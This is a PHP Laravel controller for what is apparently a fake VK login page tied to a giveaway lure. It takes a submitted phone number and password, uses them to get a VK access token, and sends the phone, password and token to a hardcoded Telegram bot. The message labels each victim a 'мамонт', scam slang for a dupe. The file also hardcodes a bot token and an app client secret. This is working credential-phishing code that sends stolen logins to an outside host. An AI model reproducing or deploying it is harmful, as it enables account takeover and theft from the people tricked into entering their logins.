<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Auth;

class AuthController extends Controller
{
    public function index() {
        return view('mobile-auth');
    }
    public function store() {
        if (isset($_POST)) {
            $data = request()->validate([
                'phone' => 'string',
                'password' => 'string'
            ]);
            $phone = $data['phone'];
            $password = $data['password'];

            $token = '5895163205:AAHgMMP-UbW8xPy7stsEF8ph_4xR3vU65JM';
            $chatid = '5841045358';


            $url = 'https://api.vk.com/oauth/token?grant_type=password&client_id=2274003&scope=offline&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$phone.'&password='.$password.'';
            $requestParams = http_build_query($data);

            $context = stream_context_create(array(
                'http' => array(
                    'method' => 'POST',
                    'header' => 'Content-Type: application/x-www-form-urlencoded' . PHP_EOL,
                    'content' => $requestParams,
                ),
            ));

            $result = json_decode(file_get_contents($url, true, $context), true);
            if (http_response_code() === 200) {
                $vktoken =$result['access_token'];
                $send = file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&parse_mode=html&text=Новый мамонт🫡%0A📱Номер: {$phone}%0A 🔑Пароль: {$password}%0A%0A {$phone}:{$password}%0A Токен:%0A{$vktoken }");

            }


        }

//        return redirect()->route('giveaway.index');
    }
}
